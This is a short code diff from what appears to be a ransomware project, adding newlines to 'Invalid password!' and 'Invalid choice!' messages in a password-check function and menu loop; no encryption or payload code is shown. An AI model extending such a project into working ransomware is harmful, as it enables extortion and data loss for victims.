@@ -24,7 +24,7 @@ def validate_password(ransomware: Ransomware) -> bool:
     if password == ransomware.password:
         print(f"\n{green}Password is correct!\n")
         return True
-    print(f"{red}Invalid password!")
+    print(f"\n{red}Invalid password!")
     return False
 
 
@@ -43,4 +43,4 @@ if __name__ == "__main__":
         elif choice == 3:
             break
         else:
-            print(f"{red}Invalid choice!")
+            print(f"{red}\nInvalid choice!")
